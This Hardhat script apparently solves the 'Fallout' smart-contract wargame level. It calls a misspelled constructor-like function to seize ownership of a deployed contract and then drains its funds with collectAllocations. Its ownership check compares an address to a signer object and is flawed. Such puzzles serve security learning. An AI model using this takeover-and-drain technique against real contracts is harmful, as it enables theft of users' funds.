const hre = require("hardhat");

async function main() {
  const [, otherAccount] = await ethers.getSigners();
  const Fallout = await hre.ethers.getContractFactory("Fallout");

  // attach your instance address
  const fallout = Fallout.attach("0xf1663dA66AE75dE6F302B3167eA18e7536a315b6");
  const currentOwner = await fallout.owner();
  console.log(`Current Owner is  ${currentOwner}`);

  // constructor is misspelled
  await fallout.connect(otherAccount).Fal1out({
    value: ethers.utils.parseEther("0.0001"),
  });
  const NewOwner = await fallout.owner();
  console.log(`New Owner is  ${NewOwner}  --> ${NewOwner === otherAccount}`);

  await fallout.collectAllocations();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
